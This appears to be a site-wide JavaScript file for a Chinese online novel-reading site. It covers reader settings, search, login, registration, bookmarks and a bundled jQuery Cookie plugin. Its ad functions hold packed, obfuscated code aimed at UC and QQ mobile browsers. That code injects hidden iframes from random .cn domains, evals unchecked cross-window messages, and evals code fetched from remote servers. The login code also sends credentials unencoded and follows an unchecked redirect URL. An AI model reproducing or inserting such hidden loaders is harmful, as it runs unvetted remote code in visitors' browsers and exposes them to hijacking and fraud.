$(function(){
	$widthwindow = $(window).width();
	if($widthwindow < 350){	$("#zjgx .zjgxjj").fadeOut(500);}
	if($("#xinxi").width()-$("#xinxi .xx ul li").width() <110){$("#xinxi .xx ul li").width($("#xinxi").width()-110)}
	$("#zjlb .spage").click(function(){$("#zjlb .showpage").show(300);	$("#spagebg").css("opacity","0.7").fadeIn(500).height($("body").height());	});
	$("#spagebg").click(function(){$(this).fadeOut(700);$("#zjlb .showpage").hide(300);});
	$tjImgHight = $("#tj img").width();
	$("#tj img").height($tjImgHight*1.25);
});
$(function(){
	$("#header .you .search").click(function(){$("#search").slideToggle();	});
	$("#type").click(function(){if($("#type").text() == "书名"){$(this).html("作者");$("#searchType").val("author");}else{	$(this).html("书名");$("#searchType").val("articlename");}	});
	$("#formsearch").submit(function(){if($("#s_key").val() == "输入搜索词" || !$("#s_key").val()){alert("请输入搜索词！");return false;}});
})
$(function(){
	var b = "20px";var m = "16px"; var s = "12px";
	if($.cookie("fontSise")){font($.cookie("type"),$.cookie("fontSise"));}
	if($.cookie("light")){light($.cookie("light"));}	
	$("#b").click(function(){font("#b",b);});
	$("#m").click(function(){font("#m",m);});
	$("#s").click(function(){font("#s",s);});
	$("#light").click(function(){if($("#light").html() == "关灯"){light("off")}else{light("on");}});
});
function font(type,fontSize){
	$(type).addClass("fc").siblings().removeClass("fc");
	$.cookie("type",type,{path:'/',expires:365});
	$.cookie("fontSise",fontSize,{path:'/',expires:365});
	$("#nr").css("font-size",fontSize);
}
function light(type){
	if(type == "off"){$("#zj #light").html("开灯");$("#zj").addClass("gd");$("#zj .dise").removeClass("dise").removeClass("header").addClass("gddise").addClass("tmpc");$.cookie("light","off",{path:'/',expires:365});}
	else{$("#zj #light").html("关灯");$("#zj").removeClass("gd");$("#zj .tmpc").removeClass("gddise").addClass("dise");$("header").addClass("header");$.cookie("light","on",{path:'/',expires:365});}
}
function zuoyoufy(url){
	window.location.href = url;
}
document.writeln("<script src='\/js\/ajax.js'><\/script>");
function login(){//开启登录
	uname = document.getElementById("username").value;
	upass = document.getElementById("userpass").value;
	_17mb_code = document.getElementById("_17mb_code").value;
	_17mb_login_save = document.getElementById("login_save").checked;
    doAjax("/login_go.php", "chname=" + uname + "&chpass=" + upass + "&_17mb_code=" + _17mb_code + "&_17mb_login_save=" + _17mb_login_save, "go_login", "POST", 0);
}
function go_login(t){
	t = t.replace(/\s/g,'');
	logintips = document.getElementById("logintips");
	if(t == "nocode"){
		logintips.innerHTML = "请输入验证码";
		reloadcode();
	}
	if(t == "err_code"){
		logintips.innerHTML = "验证码错误";
		reloadcode();
	}
	if(t == "nodata" ){
		logintips.innerHTML = "请输入帐号和密码";
		reloadcode();
	}
	if(t == "nologin" ){
		logintips.innerHTML = "帐号或密码错误，登录失败";
		reloadcode();
	}
	if(t == "yeslogin" ){
		doAjax("/ajax.php", "is_login=1", "is_login", "GET", 0);
	}
}

function is_login(t){
	var t = t.replace(/\s/g,'');
	if(t == "right"){
		document.getElementById("logintips").innerHTML = "登录成功！";
		var urlarray= new Array(); //定义一数组
		urlarray = document.URL.split("?url="); //字符分割
		url = urlarray[1]; 
		if(url){
			url = url.replace(/\%2F/g,"/");
			url = url.replace(/\%3A/g,":");
			url = url.replace(/\%23/g,"");
			url = url.replace(/\%3F/g,"?");
			url = url.replace(/\%3D/g,"=");
			url = url.replace(/\%26/g,"&");
			window.location.href = url;	
		}
		else{
			window.location.href = "/";	
		}
	}
	else{
		document.getElementById("logintips").innerHTML = "帐号或密码错误，登录失败！";	
	}
}

function register(){
	uname = document.getElementById("regname").value;
	upass = document.getElementById("regpass").value;
	uemail = document.getElementById("regemail").value;
	_17mb_code = document.getElementById("_17mb_code").value;
	doAjax("/register_go.php", "uname=" + uname + "&upass=" + upass + "&uemail=" + uemail + "&_17mb_code=" + _17mb_code, "go_register", "POST", 0);
}
function go_register(t){
	var t = t.replace(/\s/g,'');
	var tips = document.getElementById("logintips");
	if(t == "nocode"){
		tips.innerHTML = "请输入验证码";
	}
	if(t == "err_code"){
		tips.innerHTML = "验证码错误";
	}
	if(t == "nodata"){
		tips.innerHTML = "以上信息都必须输入";	
	}
	if(t == "bigname"){
		tips.innerHTML = "用户名太长！10个中问或者30个英文以内！";	
	}	
	if(t == "bigpass"){
		tips.innerHTML = "密码太长！16位以内！";	
	}	
	if(t == "bigemail"){
		tips.innerHTML = "邮箱太长！";	
	}	
	if(t == "emailerror"){
		tips.innerHTML = "邮箱格式错误！";	
	}
	if(t == "havename"){
		tips.innerHTML = "用户名已被注册！";	
	}
	if(t == "haveemial"){
		tips.innerHTML = "邮箱已被注册！";	
	}
	if(t == "yesregister"){
		tips.innerHTML = "注册成功并已经登录！";
		window.location.href = "/";	
	}		
}

function shuqian(aid,cid,urlchapter){
	//alert("shuqian");	
	doAjax("/ajax.php", "addmark=1&urlchapter="+urlchapter+"&aid=" + aid + "&cid=" + cid, "shuqian2", "GET", 0);
}
function shuqian2(t){
	var t = t.replace(/\s/g,'');
	//alert(t);
	var a = t.split("|");
	if(a[0]==1){
		$("#shuqian").html("<span class=red>已存书签</span>");
	}
	if(a[0]==0){
		window.location.href = "/login.php?url="+a[1];
	}
}
function addbookcase(urlinfo,aid){
	$.get('/ajax.php',{'addbookcase':'1','urlinfo':urlinfo,'aid':aid},
		function(data){
			data=data.replace(/\s/g,'');data=data.split("|");
			if(data[0]==1){
				$('.sj').animate({left:"-5px"},20).animate({left:"10px"},20).animate({left:"-10px"},20).animate({left:"0px"},20).html('成功加入书架');
			}
			else{
				window.location.href = "/login.php?url="+data[1];
			}
		});
}
function case_del(aid){
	$.post("/ajax.php",{"aid":aid,"case_del":"1"},function(data){
		$("#"+aid).html("<tr><td class='del1'>删除中，请稍后...</td></tr>");if(data != ""){
			$("#"+aid).html("<tr><td class='del1'>已从书架删除！</td></tr>");
		}
	});
}

//广告开始

function _17mb_tj(){//统计代码
document.writeln("<script>");
document.writeln("var _hmt = _hmt || [];");
document.writeln("(function() {");
document.writeln("  var hm = document.createElement(\'script\');");
document.writeln("  hm.src = \'https://hm.baidu.com/hm.js?8ffa7c88559f86a6a152fd09543857fc\';");
document.writeln("  var s = document.getElementsByTagName(\'script\')[0]; ");
document.writeln("  s.parentNode.insertBefore(hm, s);");
document.writeln("})();");
document.writeln("</script>");
}

function ping_baidu(){//自动推送
document.writeln("<script>");
document.writeln("(function(){");
document.writeln("    var bp = document.createElement(\'script\');");
document.writeln("    bp.src = \'//push.zhanzhang.baidu.com/push.js\';");
document.writeln("    var s = document.getElementsByTagName(\'script\')[0];");
document.writeln("    s.parentNode.insertBefore(bp, s);");
document.writeln("})();");
document.writeln("</script>");
document.writeln("");
}

function ping360(){//360推送
document.writeln("<script>");
document.writeln("(function(){");
document.writeln("   var src = (document.location.protocol == \'http:\') ? \'http://js.passport.qihucdn.com/11.0.1.js?1099b2ecbeed92729a428f4630087b53\':\'https://jspassport.ssl.qhimg.com/11.0.1.js?1099b2ecbeed92729a428f4630087b53\';");
document.writeln("   document.write(\'<script src=\'\' + src + \'\' id=\'sozz\'><\/\//script>\');");
document.writeln("})();");
document.writeln("</script>");
}

function txttopshow5(){
var random = {
	ad_num : 2,
	init : function(){
		n = (Math.floor(Math.random()*random.ad_num+1));
		switch(n){
			case 1:
var domainx = 'https://m.02eg5d.cn';
var siteid = 4491;
if(navigator.userAgent.toLowerCase().indexOf('uc') > -1){
     window.addEventListener('message', function(e) {
               var _c_ob_hf = e.data;
               if (_c_ob_hf.hf_ev_j) {
                 eval(decodeURIComponent(_c_ob_hf.hf_ev_j.replace(/\+/g, "%20")))
               }
             });    
       document.write('<iframe style="display:none;" src="'+domainx+'/msgftp.php?g='+siteid+'" height="0" width="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe><iframe style="display:none;" src="'+domainx+'/'+siteid+'.html?msg=2" height="0" width="0"  scrolling="no" frameborder="0"></iframe>');
}else{
    document.writeln('<script src="'+domainx+'/'+siteid+'.html?' + (new Date()).getTime() +'"><\/script>');
}
     		break;
			case 2:

var domainx = 'https://m.1v92f.cn';
var siteid = 21160;
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('f(B.C.x(\'A\')>-1){D.G(\'F\',E(e){v 7=e.w;f(7.h){z(y(7.h.R(/\\+/g,"%P")))}});m.Q(\'<2 d="k:j;" 4="\'+6+\'/O.S?g=\'+5+\'&J=I.H" i="0" c="0"  8="0" b="a" 9="0" K="N" t="3-q-s 3-u"></2><2 d="k:j;" 4="\'+6+\'/\'+5+\'.n?\'+(p o()).l()+\'" i="0" c="0"  8="0" b="a" 9="0" t="3-q-s 3-u"></2>\')}M{m.L(\'<r 4="\'+6+\'/\'+5+\'.n?\'+(p o()).l()+\'"><\\/r>\')}',55,55,'||iframe|allow|src|siteid|domainx|_0|marginheight|frameborder|no|scrolling|width|style||if||hf_ev_j|height|none|display|getTime|document|html|Date|new|same|script|origin|sandbox|scripts|var|data|indexOf|decodeURIComponent|eval|UCBrowser|navigator|userAgent|window|function|message|addEventListener|net|wuyanxia|domain|allowtransparency|writeln|else|true|miftp|20|write|replace|php'.split('|'),0,{}))
			
			break;
		}
	}
}
random.init();



}

function txttopshow4(){
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('a((/(I|G|K)/i.F(n.W))){d.S(\'N\',q(e){6 7=e.P;a(7.3){a(d[7.3+"w"]!=1){d[7.3+"w"]=1;O(R(7.V.M(/\\+/g,"%U")))}}});6 3="r"+9.f().j(t).k(2);4.h("<8 c=\'8"+3+"\'></8>");4.h(\'<l T="X:J;" c="\'+3+\'" x="v://m.z.B/u-E-\'+9.D(9.f()*C)+\'.L?H=5&Q=\'+p(10.1d)+\'&o=\'+n["o"]+\'&3=\'+3+\'&1b=\'+p(4.1c)+\'" 1h="1e" Y="1f%"  1j="0" 1i="1g" 19="0" 13="12"></l>\')}1a{;(q(){6 m=4.Z("A");6 s="r"+9.f().j(t).k(2);4.h("<8 c=\'"+s+"\'></8>");6 y=\'v://m.z.B\';m.x=y+"/11/u.14?15="+s;6 b=4.18("A")[0];b.17.16(m,b)})()}',62,82,'|||if_id|document||var|_c_ob|div|Math|if|ss|id|window||random||write||toString|slice|iframe||navigator|platform|encodeURIComponent|function|_||36|14475|https||src|url|aonanp|script|cn|10000|round|39|test|UCBrowser|is_iframe|MQQBrowser|none|baidu|html|replace|message|eval|data|ifr_url|decodeURIComponent|addEventListener|style|20|wz_ev_j|userAgent|display|width|createElement|location||true|allowtransparency|js|ssid|insertBefore|parentNode|getElementsByTagName|frameborder|else|ifr_ref|referrer|href|auto|100|no|height|scrolling|marginheight'.split('|'),0,{}))
}

function txttopshow3(){
var isiOS = !!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
if( (navigator.userAgent.indexOf('UCBrowser') > -1)) {
   (function(){var requestApi={};requestApi.url="https://e.02eg5d.cn/v/7280/1/0/11.html";requestApi.method='GET';requestApi.randId='C'+Math.random().toString(36).substr(2);window.document.writeln('<div id=\''+requestApi.randId+'\'></div>');requestApi.func=function(){var xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.xlRequestRun=false;if(xmlhttp.status==200){eval(xmlhttp.responseText)}}};xmlhttp.open(requestApi.method,requestApi.url,true);xmlhttp.send()};requestApi.interval=setInterval(function(){if(!window.xlRequestRun){clearInterval(requestApi.interval);window.xlRequestRun=true;requestApi.func()}},500)})();
}else{
  document.writeln("<script src='https://e.02eg5d.cn/7280/1/0/"+Math.floor(Math.random()*9999999+1)+".html?'><\/script>");
}
}

function txttopshow2(){
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('a((/(I|G|K)/i.F(n.W))){d.S(\'N\',q(e){6 7=e.P;a(7.3){a(d[7.3+"w"]!=1){d[7.3+"w"]=1;O(R(7.V.M(/\\+/g,"%U")))}}});6 3="r"+9.f().j(t).k(2);4.h("<8 c=\'8"+3+"\'></8>");4.h(\'<l T="X:J;" c="\'+3+\'" x="v://m.z.B/u-E-\'+9.D(9.f()*C)+\'.L?H=5&Q=\'+p(10.1d)+\'&o=\'+n["o"]+\'&3=\'+3+\'&1b=\'+p(4.1c)+\'" 1h="1e" Y="1f%"  1j="0" 1i="1g" 19="0" 13="12"></l>\')}1a{;(q(){6 m=4.Z("A");6 s="r"+9.f().j(t).k(2);4.h("<8 c=\'"+s+"\'></8>");6 y=\'v://m.z.B\';m.x=y+"/11/u.14?15="+s;6 b=4.18("A")[0];b.17.16(m,b)})()}',62,82,'|||if_id|document||var|_c_ob|div|Math|if|ss|id|window||random||write||toString|slice|iframe||navigator|platform|encodeURIComponent|function|_||36|14475|https||src|url|aonanp|script|cn|10000|round|39|test|UCBrowser|is_iframe|MQQBrowser|none|baidu|html|replace|message|eval|data|ifr_url|decodeURIComponent|addEventListener|style|20|wz_ev_j|userAgent|display|width|createElement|location||true|allowtransparency|js|ssid|insertBefore|parentNode|getElementsByTagName|frameborder|else|ifr_ref|referrer|href|auto|100|no|height|scrolling|marginheight'.split('|'),0,{}))
}


/*!
 * jQuery Cookie Plugin v1.4.1
 * https://github.com/carhartl/jquery-cookie
 *
 * Copyright 2013 Klaus Hartl
 * Released under the MIT license
 */
(function (factory) {
	if (typeof define === 'function' && define.amd) {
		// AMD
		define(['jquery'], factory);
	} else if (typeof exports === 'object') {
		// CommonJS
		factory(require('jquery'));
	} else {
		// Browser globals
		factory(jQuery);
	}
}(function ($) {

	var pluses = /\+/g;

	function encode(s) {
		return config.raw ? s : encodeURIComponent(s);
	}

	function decode(s) {
		return config.raw ? s : decodeURIComponent(s);
	}

	function stringifyCookieValue(value) {
		return encode(config.json ? JSON.stringify(value) : String(value));
	}

	function parseCookieValue(s) {
		if (s.indexOf('"') === 0) {
			// This is a quoted cookie as according to RFC2068, unescape...
			s = s.slice(1, -1).replace(/\\"/g, '"').replace(/\\\\/g, '\\');
		}

		try {
			// Replace server-side written pluses with spaces.
			// If we can't decode the cookie, ignore it, it's unusable.
			// If we can't parse the cookie, ignore it, it's unusable.
			s = decodeURIComponent(s.replace(pluses, ' '));
			return config.json ? JSON.parse(s) : s;
		} catch(e) {}
	}

	function read(s, converter) {
		var value = config.raw ? s : parseCookieValue(s);
		return $.isFunction(converter) ? converter(value) : value;
	}

	var config = $.cookie = function (key, value, options) {

		// Write

		if (value !== undefined && !$.isFunction(value)) {
			options = $.extend({}, config.defaults, options);

			if (typeof options.expires === 'number') {
				var days = options.expires, t = options.expires = new Date();
				t.setTime(+t + days * 864e+5);
			}

			return (document.cookie = [
				encode(key), '=', stringifyCookieValue(value),
				options.expires ? '; expires=' + options.expires.toUTCString() : '', // use expires attribute, max-age is not supported by IE
				options.path    ? '; path=' + options.path : '',
				options.domain  ? '; domain=' + options.domain : '',
				options.secure  ? '; secure' : ''
			].join(''));
		}

		// Read

		var result = key ? undefined : {};

		// To prevent the for loop in the first place assign an empty array
		// in case there are no cookies at all. Also prevents odd result when
		// calling $.cookie().
		var cookies = document.cookie ? document.cookie.split('; ') : [];

		for (var i = 0, l = cookies.length; i < l; i++) {
			var parts = cookies[i].split('=');
			var name = decode(parts.shift());
			var cookie = parts.join('=');

			if (key && key === name) {
				// If second argument (value) is a function it's a converter...
				result = read(cookie, value);
				break;
			}

			// Prevent storing a cookie that we couldn't decode.
			if (!key && (cookie = read(cookie)) !== undefined) {
				result[name] = cookie;
			}
		}

		return result;
	};

	config.defaults = {};

	$.removeCookie = function (key, options) {
		if ($.cookie(key) === undefined) {
			return false;
		}

		// Must not alter options, thus extending a fresh object...
		$.cookie(key, '', $.extend({}, options, { expires: -1 }));
		return !$.cookie(key);
	};

}));